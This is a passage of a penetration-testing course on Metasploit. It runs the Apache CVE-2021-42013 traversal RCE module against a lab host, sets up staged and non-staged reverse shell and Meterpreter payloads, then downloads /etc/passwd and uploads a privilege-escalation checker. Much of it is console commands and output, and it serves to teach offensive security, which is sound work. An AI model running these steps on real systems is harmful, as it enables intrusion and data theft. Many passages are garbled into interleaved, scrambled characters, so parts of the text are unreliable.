+0 <cr>exploit</cr>/multi/http/apache_normalize_path_rce 2021-05-10
+
+excellent Yes Apache 2.4.49/2.4.50 Traversal RCE
+
+     1  <cArp>aacuhxeil2i.a4Lr.isy4ti<9n//gc26r.9>43/.-s5Cc0reaanTtnreeaarvn/eehrwtswatplo/rkRaspCpEaacceshecan_adnnonWserehairmrtacllhoifwozreA_ppaacthhe    2021-05-10                                                                                                                                                                                                                    normal
+No                                                                                                                                                          2.4.49 modules
+
+LmmLa[s*ieusef]txt'n6siilntUiaiugsaorsiunye6nxegi9mtdlh3icvoeoaudsernlhunxfyolepe(iwrlgsoatucsibhtraiaenmltithndtyoaec.rptdhIa/uneoysldceulsekrohaxs/ans0sdOdiesfSrahle-eori_5nfcnln7ethe7eours5xgrr2oi/iten1onxrs9f6)uot0m4hl/>tteJoeomedrce<erfoctefieurvnrtr>raieeepurytswgrswpeeeoiotttsne0smdr<dy//ienascrsgttueeccv>ehmreixipnrsptsgliooea_inmrtet.mocvpdouudllnueelser..aIbnledetxo  1 refers to an
+                                                                                                                                                                                                                                                                                                                                                                                            the previously
+
+msf6 exploit(multi/http/apache_normalize_path_rce) > <cu>info</cu>
+
+            Name: Apache 2.4.49/2.4.50 Traversal RCE
+         Module: exploit/multi/http/apache_normalize_path_rce
+     Platform: Unix, Linux
+
+            Arch: cmd, x64, x86
+...
+Module side effects:
+
+ ioc-in-logs
+ artifacts-on-disk
+
+Module stability:
+ crash-safe
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                                                                                                                                                            695
+                                                                          Penetration Testing with Kali Linux
+
+Module reliability:
+ repeatable-session
+
+Available targets:
+   Id Name
+   -- ----
+   0 Automatic (Dropper)
+   1 Unix Command (In-Memory)
+
+Check supported:
+   Yes
+
+...
+
+Description:
+   This module exploit an unauthenticated RCE vulnerability which
+   exists in Apache version 2.4.49 (CVE-2021-41773). If files outside
+   of the document root are not protected by 'require all denied'
+   and CGI has been explicitly enabled, it can be used to execute
+   arbitrary commands (Remote Command Execution). This vulnerability
+   has been reintroduced in Apache 2.4.50 fix (CVE-2021-42013).
+
+...
+                                       Listing 694 - Activate exploit module and show its information
+
+The output contains several important pieces of information in the context of this exploit module.
+Before we blindly set our target and run an exploit module, we should always understand what
+the module is doing by reviewing the module's information. The output starts with general
+information about the exploit such as the name, platform, and architecture.
+
+TsTdTuehhhcfeeisehnomaadunosetdpdrIsuutnhltdmeeiacarlmaseytoloiooadrcbbsuotillanioetiytfnsacdtifnaoreobsmtmielipinrtmryfuooshimrnemueilsspsaeintuiifegosnnwtptherariiesebcdsoeaiucxinntptJerliplofuofoiwfngttremetesnhyomoteliduaWaeuhtlyixilsoepctin.dlrlosaeo,iswteahmfnfadeo,ctraitensrgttohehfatisnrsuyeonsxnntaecimnmeg.poIltenhr,iswoaurhetraxifpetalxcionatifstmomorpmnloeadd, tuitisohlekne.,
+svTouyuhsltenpteeuarmtvasabstillaeaatbnetldaserragteapeprptegslaeicttbaasybtialoetrhn-eseaeveseosrxsfipoiOotlnohSn.i-etsT5h7mot7oius5ot2cipds1ouu9imtlm0e.cmpoOoamrfnttamdennoetnxtahelsyecssucoetoimontntaearmiegnxesepttslhdooiirftadfmensrg.eoeMndtuoflrtesoastmrgmweidotllidfosfupneleleryescnwifptiocroorakpvtiioeodrnneacstetinh.ogef
+Automatic target, which Metasploit tries to identify either by itself or by using the default
+operation specified by the module.
+
+Check supported determines if we can use the check command to dry-run the exploit module and
+confirm if a target is vulnerable before we attempt to exploit it.
+
+Description provides us a text-based explanation of the module's purpose. According to the
+output of this module's description, it seems to be the correct module for the vulnerability
+identified by the hypothetical vulnerability scan.
+
+Now that we understand of what the exploit module does and what implications the execution of
+it has, we can display its options.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.  696
+                                                                                                     Penetration Testing with Kali Linux
+
+msf6 exploit(multi/http/apache_normalize_path_rce) > <cu>show options</cu>
+
+Module options (exploit/multi/http/apache_normalize_path_rce):
+
+Name     Current Setting Required Description
+
+----     --------------- -------- -----------
+
+CVE      CVE-2021-42013 yes           The vulnerability to use (Accepted: CVE-2021-
+
+41773, CVE-2021-42013)
+
+DEPTH    5                 yes        Depth for Path Traversal
+
+Proxies                    no         A proxy chain of format
+
+type:host:port[,type:host:port][...]
+
+RHOSTS                     yes        The target host(s), see
+
+https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+
+RPORT    443               yes        The target port (TCP)
+
+SSL      true              no         Negotiate SSL/TLS for outgoing connections
+
+TARGETURI /cgi-bin         yes        Base path
+
+VHOST                      no         HTTP server virtual host
+
+Payload options (linux/x64/meterpreter/reverse_tcp):
+
+     Name Current Setting  Required   Description
+     ---- ---------------  --------   -----------
+     LHOST                 yes        The listen address (an interface may be
+specified)
+     LPORT 4444            yes        The listen port
+
+...
+                                            Listing 695 - Display the options of the exploit module
+
+PpTrhaeyevloiooapudtsioonspseticostnhioso.nwI.fnHwionewLdeiosvntei'ntr,gsfe6ot9rt5heiaxsrp, etlohliietkemmtohodeduuollepetswi,oilntlhWssheeairletvelacoiitslwaabadlneeffaoadurdlttihtpieoanayaulolxaioldiap.rtTyiohmne odsdeeucfalteiuoslntfpronamaymlotaehdde
+WpLmrtmiesHagvaefyhOe'y6lltolrSnscaceTeoodox.nt/pvsltblienrhoeroueildxlwtlo./i(fhxffmW6aetuh4trelee/wtnsceiehtax/epwpnhllatl_aotysrniepletotav/leaetoaicdroprstsaneecOax_iphnSptrec-peot_p5achcn7.ytee7o,Ilsn5orsns2maoea1.adx9dilt0tdi'wszLitJieaeiteoh_lafwnprf,snaartweiyenhtsyeg_pbreUaecnynetttl)ieeot,rra>bdtthou<etacsnfueIoPd>trsoatenuhdtoredwoprepapwsaytsiyleoloonoasasfdedoet uxintpraltKimocaietalli,ymritneoagocumhulaairnrinecTtaaCfsoiPner
+
+linux/x64/shell_reverse_tcp</cu>
+payload => linux/x64/shell_reverse_tcp
+
+msf6 exploit(multi/http/apache_normalize_path_rce) > <cu>show options</cu>
+...
+
+Payload options (<cr>linux/x64/shell_reverse_tcp</cr>):
+
+     Name Current Setting  Required   Description
+     ---- ---------------  --------   -----------
+     LHOST 192.168.119.2   yes        The listen address (an interface may be
+specified)
+     LPORT 4444            yes        The listen port
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                             697
+                                                                                                                                   Penetration Testing with Kali Linux
+
+...
+                                                 Listing 696 - Set payload of the exploit module
+
+The output shows that the entered payload is now active for the exploit module. There are two
+options for this payload named LHOST (the local host IP address or interface) and LPORT (the
+local port), which are used for the reverse shell to connect to.
+
+By default, most exploit modules use the port 4444 in the LPORT payload option. Depending on
+our machine's configuration, Metasploit may already set the LHOST value for us. We should
+always double-check this value, especially if our machine contains multiple interfaces, because
+Metasploit may reference the wrong interface to set this value.
+
+     In real penetration tests we may face the situation that port 4444 is blocked by firewalls
+     or other security technologies. This is quite common as it is the default port for
+     Metasploit's modules. In situations like this, changing the port number to ports
+     associated with more commonly used protocols such as HTTP or HTTPS may lead to a
+     successful execution of the selected payload.
+
+We should note that we don't need to start a listener manually with tools such as Netcat to
+receive the incoming reverse shell. Metasploit automatically sets up a listener matching the
+specified payload.
+
+Now, let's set the options SSL to false and RPORT to 80 since the target Apache web server runs
+
+moSSsnLfp6o=e>rtx8pfal0lowisteit(hmouulttHi/ThTtPtSp/. aTphaecnh,ew_neosremtaRliHzOeS_pTaSttho_rWthcheiet)tlao>rwg<ect uIP>saentd  enter run.
+
+                                                                                                                                   SSL false</cu>
+
+RmsPfOR6Tex=p>l8o0it(multi/http/apache_normalizJee_fpfartehy_rce) > <cu>set RPORT 80</cu>
+
+Rm<msHscOfrf66>ST[*eeSx]x=ppll>Sootii1att9r2t((.emm1duu6ll8trti.ei5v//he0h.ttrt1st6pep//TaapCpaaPccOhhhSaee-__n5ndn77loo5rre2rmm1aa9lol0inizzee1_9_2ppaa.tt16hh_8_rr.cc11ee9)).>>2:4<<c4cu4u>>4<srue/tncr<R>/cHOu>STS 192.168.50.16</cu>
+
+[*] Started reverse TCP handler on 192.168.119.4:4444
+
+[*] Using auxiliary/scanner/http/apache_normalize_path as check
+
+[+] http://192.168.50.16:80 - The target is vulnerable to CVE-2021-42013 (mod_cgi is
+
+enabled).
+
+[*] Scanned 1 of 1 hosts (100% complete)
+
+[*] http://192.168.50.16:80 - Attempt to exploit for CVE-2021-42013
+
+[*] http://192.168.50.16:80 - Sending linux/x64/shell_reverse_tcp command payload
+
+<cr>[*] Command shell session 2 opened (192.168.119.4:4444 -> 192.168.50.16:35534) at
+
+2022-08-08 05:13:45 -0400</cr>
+
+[!] This exploit may require manual cleanup of '/tmp/ruGC' on the target
+
+<cu>id</cu>
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+                                                     Listing 697 - Running the exploit module
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                           698
+                                                                          Penetration Testing with Kali Linux
+
+Once launched, the exploit module first starts a listener on port 4444 and uses the previously
+shown auxiliary module to check if the target is indeed vulnerable. In our case, it is vulnerable as
+shown in Listing 697. Then, the vulnerability is exploited, and the payload is sent. The console
+states that a session is opened, and we have obtained command execution.
+
+Before we head to the next section, let's explore the concept of sessions and jobs in Metasploit.
+Sessions are used to interact and manage access to successfully exploited targets, while jobs are
+used to run modules or features in the background.
+
+When we launched the exploit with run, a session was created, and we obtained an interactive
+
+C z shell. We can send the session to the background by pressing + and confirming the
+
+prompt. Once the session is sent to the background, we can use sessions -l to list all active
+sessions.
+
+<cu>^Z</cu>
+Background session 2? [y/N] <cu>y</cu>
+
+msf6 exploit(multi/http/apache_normalize_path_rce) > <cu>sessions -l</cu>
+
+Active sessions
+===============
+
+Id Name Type          Information Connection
+
+-- ---- ----          ----------- ----------
+
+...
+
+2    shell x64/linux  192.168.119.4:4444 -> 192.168.50.16:35534
+
+(192.168.50.16)
+
+                             Listing 698 - Backgrounding a session and listing all currently active sessions
+
+TtohiedeonuttipfyutwphriocvhidseesssuisoninmfoarmnaagtieosnaacbcoeuststthoewtahrigcehtWtaahnrigdtelpto.awyload in use. This makes it easy for us
+LmWx[<8i*cse6nf]u6u>_cxS6uae4ntnaaxcmrpx1inetld8tio6be-ain_ra6tgca<4e(c/7imtcxnbuwutla8i>teb6t_r7ih6/at54hch.ttetGi4s.poN0/Unea/-spwL1saii2iotnc2Onhuh-Sexg-a2_e5gn.n7a7.oei5.rrn2mib1ac9yl0i#pz1aJe3es_8fsp-fiaUnrtbgehuyt_nhrtecues)SeMs>Psio<WnceudI>DsJteuosnssi2eo2snss1io5n:-0is0-:2i.3<1/cUuT>C 2022
+
+                 Listing 699 - Interacting with the previously backgrounded session
+
+Listing 699 shows that we can again enter commands in the interactive shell. We can kill a
+session with sessions -k and the ID as argument.
+
+Instead of launching an exploit module and sending the resulting session to the background, we
+can use run -j to launch it in the context of a job. This way, we'll still find the output of launching
+the exploit module, but we'll need to interact with the resulting session before we can access it.
+
+Let's zoom out here for a moment and discuss why working with sessions and jobs is vital in a
+real penetration test. In an assessment, we'll face numerous targets, and it is very easy to lose
+track of machines we already have access to. Using an exploit framework like Metasploit helps us
+manage access to these machines.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.             699
+                                                                          Penetration Testing with Kali Linux
+
+If we want to execute commands on a specific system, we don't have to search through various
+terminals to find the correct Netcat listener, we can just interact with the specific session. We can
+launch exploit modules with run -j in the background and Metasploit will automatically create a
+session for us while we already work on the next target.
+
+In addition, Metasploit also stores information about targets, module results, and vulnerabilities in
+the database, which are invaluable for further steps in a penetration test and writing the report for
+the client.
+
+Using exploit modules in Metasploit is a straightforward process. As we learned in the Modules
+Locating Public Exploits and Fixing Exploits, working with public exploits may require a lot of
+modification to get them working. This quite differs for exploit modules in Metasploit. Once we
+find the correct exploit module, understand the implications of it, and set the options, we can
+launch the exploit. Metasploit also sets up the correct listener to provide us interactive shell
+access, depending on the payload we set.
+
+The payload determines what happens on a system after a vulnerability is exploited. In the
+example of this section, we chose a common 64-bit Linux TCP reverse shell. However, Metasploit
+contains various other payloads. Depending on our needs, we have to understand what payload
+to set and how to configure it. In the next Learning Unit, we'll explore the most important payload
+types offered by Metasploit.
+
+21.2 Using Metasploit Payloads
+
+This Learning Unit covers the following Learning Objectives:
+
+�   Understand the differences between  staged  andWhniotlno-swtaged      payloads
+�   Explore the Meterpreter payload
+
+�      Create executable payloads   leveraged  Jlienfufxr/exy64/shell_reverse_tcp  as  a  payload  for  an  exploit
+In  the previous Learning Unit, we
+
+pagmareecornrehfdeoviurtreaelmercts.itinenMuggrseevhtsdaae.irsflifIlop.neulroIensaintdfttcdihloeioitsniptotyeaLnprie,aenaMtssironecnnitounOsanSmgs-topae5Unl7ironno7iitiu5tnth2,sgec1woo9pt0nteaaht'ylraelgloridenaptiss.dacsyFmuluotsaorasntdhpysseetrortamfatoghroregemrderet,picvntasehgyretnldaooifiafnnrfdae-omsrteptyaenepgwtreaeoostdpirokbepnreiasasyy,toilsnaonulgadscdoshbsy,caasassteepixcsmaptblassolhrertaeeinnlolgdsaf
+
+special kind of payload named Meterpreter, and explore executable files containing payloads.
+
+21.2.1 Staged vs Non-Staged Payloads
+
+In this section, we'll explore the differences between staged and non-staged payloads. Let's
+assume we've identified a buffer overflow vulnerability in a service. As we learned in Fixing
+Exploits, we need to be aware of the buffer size our shellcode will be stored in. If the shellcode
+size of our exploit exceeds the buffer size, our exploit attempt will fail. In a situation like this, it's
+vital which payload type we choose: staged or non-staged.
+
+The difference between these payload types is subtle but important. A non-staged payload is sent
+in its entirety along with the exploit. This means the payload contains the exploit and full
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                    700
+                                                                                                           Penetration Testing with Kali Linux
+
+shellcode for a selected task. In general, these "all-in-one" payloads are more stable. The
+downside is that the size of these payloads will be bigger than other types.
+
+In contrast, a staged payload is usually sent in two parts. The first part contains a small primary
+payload that causes the victim machine to connect back to the attacker, transfer a larger
+secondary payload containing the rest of the shellcode, and then execute it.
+
+There are several situations in which we would prefer to use a staged payload instead of non-
+staged. If there are space-limitations in an exploit, a staged payload might be a better choice as it
+is typically smaller. In addition, we need to keep in mind that antivirus software can detect
+shellcode in an exploit. By replacing the full code with a first stage, which loads the second and
+malicious part of the shellcode, the remaining payload is retrieved and injected directly into the
+victim machine's memory. This may prevent detection and can increase our chances of success.
+
+Now that we have a basic understanding of these two types of payloads, let's get our hands dirty.
+For this, we'll use the same exploit module as in the previous section and enter show payloads to
+get a list of all payloads that are compatible with the currently selected exploit module.
+
+msf6 exploit(multi/http/apache_normalize_path_rce) > <cu>show payloads</cu>
+Compatible Payloads
+===================
+
+# Name                                                                                            Disclosure Date Rank
+
+Check Description
+
+- ----                                                                                            --------------- ---- ----
+
+- -----------
+
+...
+
+     15 payload/linux/x64/shell/reverse_tcp                                              Whitlow                   normal No
+Linux Command Shell, Reverse TCP Stager                                                                            normal No
+...
+
+     20 payload/linux/x64/shell_reverse_tcp
+                                     T- CDPispIlanylcionmeJpeaftifbrleepyayloads
+Linux  Command  Shell,  Reverse
+...                     Listing 700
+
+                                                                                         of  the  exploit  module
+
+Listing 700 shows us the   apptaaiyynlloodOSaae-dxd51i7ws57e5si2stua1.s9ge0edd  before   at index 20. In Metasploit, the "/" character is
+used to denote whether a                                                        or not,  so shell_reverse_tcp at index 20 is not staged,
+whereas shell/reverse_tcp
+
+Let's use the staged payload for this exploit module and launch it. We should note that Metasploit
+
+will reuse the values for the options from the previous payload.
+
+msf6 exploit(multi/http/apache_normalize_path_rce) > <cu>set payload 15</cu>
+payload => linux/x64/shell/reverse_tcp
+
+msf6 exploit(multi/http/apache_normalize_path_rce) > <cu>run</cu>
+
+[*] Started reverse TCP handler on 192.168.119.4:4444
+[*] Using auxiliary/scanner/http/apache_normalize_path as check
+[+] http://192.168.50.16:80 - The target is vulnerable to CVE-2021-42013 (mod_cgi is
+enabled).
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] http://192.168.50.16:80 - Attempt to exploit for CVE-2021-42013
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                      701
+                                                                          Penetration Testing with Kali Linux
+
+[*] http://192.168.50.16:80 - Sending linux/x64/shell/reverse_tcp command payload
+<cr>[*] Sending stage (38 bytes) to 192.168.50.16</cr>
+[!] Tried to delete /tmp/EqDPZD, unknown result
+[*] Command shell session 3 opened (192.168.119.4:4444 -> 192.168.50.16:35536) at
+2022-08-08 05:18:36 -0400
+
+<cu>id</cu>
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+                             Listing 701 - Use staged TCP reverse shell payload and launch exploit module
+
+Listing 701 shows that we successfully obtained a reverse shell by using the staged payload. The
+output states that the sent stage was only 38 bytes in size, making it a great choice when we
+attempt to exploit a vulnerability with space constraints.
+
+Obtaining a reverse shell with a staged payload concludes this section. We discussed the
+differences of staged and non-staged payloads and used a staged payload to launch an exploit
+module.
+
+In the examples so far, there have been only minor differences between staged and non-staged
+payloads since Metasploit did the heavy lifting for us in the background. In both situations, we
+were provided with a session on the target machine. In the last section of this Learning Unit, we'll
+manually set up listeners and further review the differences of both payload types.
+
+21.2.2 Meterpreter Payload
+
+In the previous sections, we used a common TCP reverse shell. While we do have interactive
+
+access to a target system with this type of payload, we only have the functionality of a regular
+                   sEuxcphloaitsffrialemterawnosrfkesrso, fptievnotcinogn,taanindWmvhaiortiroleouwasdovtahnecremdepthaoydlosaodfsinptreorvaicdtiningg
+command shell.                                                                                                                                         features
+and functionality                                                                                                                                      with the
+victim machine.
+                         rMune-tteimrpere. tTehr eppaaylyoJloaeadfdf, rwreeyhsiicdhesisenatirmeluyltini-fumnecmtioonry
+Metasploit contains the                                                                                                 payload that                   can  be
+dynamically extended at                                                                                                 on the target                  and  its
+
+Lmicnoeattm'hcseOmdSpuis,onApsiclntaa-dyetrxioaoplinldloc,iisaotanmetdinopcmnartyopibprhelteae. sdpeabayOylnSod-da5ede7fsa7x5uisi2nltt1s.9tMh0foeerteevxrapprlirooeiuttesmr ooopfdefuerlarestifncrgoampsaybtshitleeitmiepsrse,tvshiuoacut hsaraseseceWtsipoinnedcsoiaawlglsya, iuLnsinaeunfuxdl,
+
+search for Meterpreter payloads. Once we find a non-staged 64-bit Meterpreter TCP reverse shell
+
+payload, we'll activate it and display its options.
+
+msf6 exploit(multi/http/apache_normalize_path_rce) > <cu>show payloads</cu>
+
+Compatible Payloads
+===================
+
+     # Name                                                               Disclosure Date Rank                                                         ----
+Check Description                                                         --------------- ----
+
+     - ----                                                                                                             normal No
+- -----------
+
+     ...
+     7 payload/linux/x64/meterpreter/bind_tcp
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                    702
+                                                                          Penetration Testing with Kali Linux
+
+Linux Mettle x64, Bind TCP Stager
+
+    8 payload/linux/x64/meterpreter/reverse_tcp                           normal No
+                                                                          normal No
+Linux Mettle x64, Reverse TCP Stager                                      normal No
+
+    9 payload/linux/x64/meterpreter_reverse_http                                 normal
+
+Linux Meterpreter, Reverse HTTP Inline
+
+    10 payload/linux/x64/meterpreter_reverse_https
+
+Linux Meterpreter, Reverse HTTPS Inline
+
+    <cr>11 payload/linux/x64/meterpreter_reverse_tcp
+
+No       Linux Meterpreter, Reverse TCP Inline</cr>
+
+    ...
+
+msf6 exploit(multi/http/apache_normalize_path_rce) > <cu>set payload 11</cu>
+payload => linux/x64/meterpreter_reverse_tcp
+
+msf6 exploit(multi/http/apache_normalize_path_rce) > <cu>show options</cu>
+...
+
+Payload options (linux/x64/meterpreter_reverse_tcp):
+
+    Name Current Setting Required Description
+
+    ---- --------------- -------- -----------
+
+    LHOST 192.168.119.2 yes                The listen address (an interface may be
+
+specified)
+
+    LPORT 4444             yes             The listen port
+
+...
+
+    Listing 702 - Review compatible Meterpreter payloads of the exploit module and use 64bit meterpreter_reverse_tcp
+
+Listing 702 shows that there are various Meterpreter payloads compatible for the currently
+
+activated exploit module.
+
+At this point, we should   note  that all  Manedtenrporne-tsetragpWeahdiytlolpaoawdysloaadres.sTtahgeedd;ifhfeorwenecveerb, ethtwe eoeuntptuhtosoef
+show payloads contains     both  staged
+
+tvvweerrossiitooynnpeuisnsceislsudhaeossweapthlaleracMotemeftpierosrpntresenttatesgr epreatqoyulolioraeadddJistethoftefrasrlaeenuysncfoecrhmrepadontMoeentttheser.pLtraoeratgederitnsgmestahsceihosinenecw.oThmihleepontnhoeenn-tsssttaaoggveeeddr
+Maothnueordanbusealstenwe,dswowsremikd'lltcehurnestisa,etalteihmsneiqotneunodi-tnseo-tsarstgwoaemgedeOewdSMta-vr5neae7ttfre7fsti5roicpo2r1unae9sntw0eedhrtmehpneaaeysyvalaeomlraewdertepcdauoeysmfleeoenaassdiMvitneoetmqceuorepimctrehepathrenoarimnspmdaisyyse.l.oFmIanodurs.ltitithpuelaetrisoeynsststeowmfhsethrinee
+
+After selecting the 64-bit non-staged version of meterpreter_reverse_tcp as payload, we can
+
+review its options. For this payload, the same options apply as those for the previous payloads we
+
+used.
+
+Now, let's run the exploit module with our Meterpreter payload. Once we obtain a Meterpreter
+command prompt, we'll display its available commands by entering help.
+
+msf6 exploit(multi/http/apache_normalize_path_rce) > <cu>run</cu>
+
+[*] Started reverse TCP handler on 192.168.119.4:4444
+[*] Using auxiliary/scanner/http/apache_normalize_path as check
+[+] http://192.168.50.16:80 - The target is vulnerable to CVE-2021-42013 (mod_cgi is
+enabled).
+[*] Scanned 1 of 1 hosts (100% complete)
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                              703
+                                                                                                                                                                                                                                                 Penetration Testing with Kali Linux
+
+[*] http://192.168.50.16:80 - Attempt to exploit for CVE-2021-42013
+[*] http://192.168.50.16:80 - Sending linux/x64/meterpreter_reverse_tcp command
+payload
+[*] Meterpreter session 4 opened (192.168.119.4:4444 -> 192.168.50.16:35538) at 2022-
+08-08 05:20:20 -0400
+[!] This exploit may require manual cleanup of '/tmp/GfRglhc' on the target
+
+meterpreter > <cu>help</cu>
+
+Core Commands
+=============
+
+Command                      Description
+-------                      -----------
+?                            Help menu
+background                   Backgrounds the current session
+...
+channel                      Displays information or control active channels
+close                        Closes a channel
+...
+info                         Displays information about a Post module
+...
+load                         Load one or more meterpreter extensions
+...
+run                          Executes a meterpreter script or Post module
+secure                       (Re)Negotiate TLV packet encryption on the session
+sessions                     Quickly switch to another session
+...
+
+...                                         Whitlow
+Stdapi: System Commands
+
+====g-ggekC=eoie-xe=-etttml=pum-lec=-niaiu=-dvdnt=ed-========-GTGDGE=-xeeeee=-rtsett=-mcc=-toriut=-nhhtin-peaeee-tt-cauieo-urosO-canreSmorr-oemp5rmtnr77ateoh5nca2ptdee1rns9tovs0hiceerJosesnsfemferirvndeeetynrtviairfsiiearrubnlneivngaluaess
+
+localtime      Displays the target system local date and time
+
+pgrep          Filter processes by name
+
+pkill          Terminate processes by name
+
+ps             List running processes
+
+shell          Drop into a system command shell
+
+suspend        Suspends or resumes a list of processes
+
+sysinfo        Gets information about the remote system, such as OS
+
+               Listing 703 - Display compatible payloads of the exploit module
+
+A few moments after the exploit module is launched, we'll get a Meterpreter command prompt as
+shown in Listing 703. The commands of Meterpreter are divided into categories such as System
+Commands, Networking Commands, and File system Commands.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                         704
+                                                                                          Penetration Testing with Kali Linux
+
+Let's get familiar with some of the Meterpreter commands. We'll start gathering information by
+entering sysinfo and getuid.
+
+meterpreter > <cu>sysinfo</cu>
+
+Computer     : 172.29.0.2
+
+OS           : Ubuntu 20.04 (Linux 5.4.0-122-generic)
+
+Architecture : x64
+
+BuildTuple : x86_64-linux-musl
+
+Meterpreter : x64/linux
+
+meterpreter > <cu>getuid</cu>
+Server username: daemon
+
+                                      Listing 704 - Display compatible payloads of the exploit module
+
+The commands provide us with information about the target computer, operating system, and
+the current user.
+
+As we've already learned, Metasploit uses sessions to manage access to different machines.
+
+When Metasploit interacts with a system within a session, it uses a concept named channels.
+
+Let's start an interactive shell by entering shell, execute a command in the context of a channel,
+
+C z and background the channel the shell runs in. To background a channel, we can use + .
+
+meterpreter > <cu>shell</cu>
+
+Process 194 created.
+
+<cr>Channel 1 created.</cr>
+
+<cu>id</cu>
+
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+<cu>^Z</cu>
+
+Background channel  1?  [y/N] <cu>y</cu>                channeWl ahnidtlboawckground
+meterpreter >                   Listing 705 - Start
+
+                                                     a                                it
+
+Next, we'll start  a second interactive  shell,  exJeefcfurteeya  command,  and           background   the  channel.
+
+meterpreter >      <cu>shell</cu>
+                             OS-57752190
+Process 196 created.
+<cr>Channel 2 created.</cr>
+<cu>whoami</cu>
+daemon
+<cu>^Z</cu>
+
+Background channel 2? [y/N] <cu>y</cu>
+
+                         Listing 706 - Start a second channel and background it
+
+Now, let's list all active channels and interact with channel 1 again. To list all active channels, we
+can enter channel -l and to interact with one, we can use channel -i and the channel ID as
+argument.
+
+meterpreter > <cu>channel -l</cu>
+
+    Id Class Type
+
+    -- ----- ----
+
+    13             stdapi_process
+
+    23             stdapi_process
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                              705
+                                                                          Penetration Testing with Kali Linux
+
+meterpreter > <cu>channel -i 1</cu>
+Interacting with channel 1...
+
+<cu>id</cu>
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+                                      Listing 707 - List all active channels and interact with channel 1
+
+Listing 707 shows we can execute commands in the context of channel 1 again. Using channels
+will help us tremendously to manage system access and perform post-exploitation operations.
+
+Next, let's use the download and upload commands from the category File system Commands to
+transfer files to and from the system. For this, let's review the commands of this category first.
+
+meterpreter > <cu>help</cu>
+...
+Stdapi: File system Commands
+============================
+
+       Command   Description
+       -------   -----------
+       cat       Read the contents of a file to the screen
+       cd        Change directory
+       checksum  Retrieve the checksum of a file
+       chmod     Change the permissions of a file
+       cp        Copy source to destination
+       del       Delete the specified file
+       dir       List files (alias for ls)
+       download  Download a file or directory
+       edit      Edit a file
+       getlwd
+       getwd     PCPLPRLhrrrieiiasaisitnnndtnttgtltefholliwoelclooorcecasaccalkoallifnlngiwwteloowrdeonrtrskiksiikrnineggocngtfddoJirdaieiyrrfeelrfcocerttcceoaotyrorlryyWfyhiitlleowto the screen
+       lcat      MRMDSPreeaoemvlkiaonreeecttveshdeiwotofdrurihreocrrkecOeteiSscnfo-gptirt5oleyo77drec5siiyd2fer1esi9cet0itdnorfatiylieon
+       lcd
+       lls       Upload a file or directory
+       lpwd
+       ls                Listing 708 - List all File system Commands of Meterpreter
+       mkdir
+       mv
+       pwd
+       rm
+       rmdir
+       search
+       upload
+...
+
+Listing 708 shows us various commands that we can use to upload, download, or manage files
+on the local and target system. Commands with "l" as prefix operate on the local system; in our
+case our Kali VM. For example, we can use these commands to change the directory to where we
+want to download or upload files.
+
+Let's download /etc/passwd from the target machine to our Kali system. For this, we'll change
+the local directory on our Kali machine to /home/kali/Downloads first. Then, we'll enter the
+download command and /etc/passwd as argument.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                            706
+                                                                                                                                           Penetration Testing with Kali Linux
+
+meterpreter > <cu>lpwd</cu>
+/home/kali
+
+meterpreter > <cu>lcd /home/kali/Downloads</cu>
+
+meterpreter > <cu>lpwd</cu>
+/home/kali/Downloads
+
+meterpreter > <cu>download /etc/passwd</cu>
+[*] Downloading: /etc/passwd -> /home/kali/Downloads/passwd
+[*] Downloaded 1.74 KiB of 1.74 KiB (100.0%): /etc/passwd ->
+/home/kali/Downloads/passwd
+[*] download : /etc/passwd -> /home/kali/Downloads/passwd
+
+meterpreter > <cu>lcat /home/kali/Downloads/passwd</cu>
+root:x:0:0:root:/root:/bin/bash
+...
+
+                      Listing 709 - Change local directory and download /etc/passwd from the target machine
+
+Listing 709 shows that we could successfully download /etc/passwd to our local machine.
+
+Next, let's assume we want to run unix-privesc-check like in a previous Module to find potential
+privilege escalation vectors. Let's upload the file to /tmp on the target system.
+
+meterpreter > <cu>upload /usr/bin/unix-privesc-check /tmp/</cu>
+[*] uploading : /usr/bin/unix-privesc-check -> /tmp/
+[*] uploaded : /usr/bin/unix-privesc-check -> /tmp//unix-privesc-check
+
+meterpreter > <cu>ls /tmp</cu>
+
+M-.=<Lo=-.icd=r.s-=t>-e=1i0=n0=g=:64=4=/=t/rm==wp-r--r--S--i-z-e36801T-y-p-e-fiL-la-s-t--2m-0Jo-2ed-2fi--ff-0ri-8ee--yd-08Whi0t5l:o2w6:15       Name
+                                                                                                                                                ----
+
+                                                                                                                                           -0400 unix-privesc-
+
+check</cr>   tshheoWwsintdhoawt Lswisoetinpsgeu7rca1Oct0Sien--sUg5sp7sfl7ouy5als2dlyti1ne9ugm0pu,lnowixa-epdrenivdeeseucd-nctihxoe-cpekrsitvoceatshpece-tcatrhhgeeect bmkaatcockhtsinhleaesthaersgeint  machine. If our
+                                                                                                                                                                                                        the destination
+Listing 710
+target runs
+
+path with backslashes like "\\".
+
+So far, we've used the linux/x64/meterpreter_reverse_tcp payload in this section to explore various
+features of Meterpreter. Before we head into the next section, let's use another 64-bit Linux
+Meterpreter payload. Therefore, we exit the current session and use show payloads in the context
+of the exploit module again.
+
+meterpreter > <cu>exit</cu>
+[*] Shutting down Meterpreter...
+
+[*] 192.168.50.16 - Meterpreter session 4 closed. Reason: User exit
+
+msf6 exploit(multi/http/apache_normalize_path_rce) > <cu>show payloads</cu>
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                707
+                                                                                                                                    Penetration Testing with Kali Linux
+
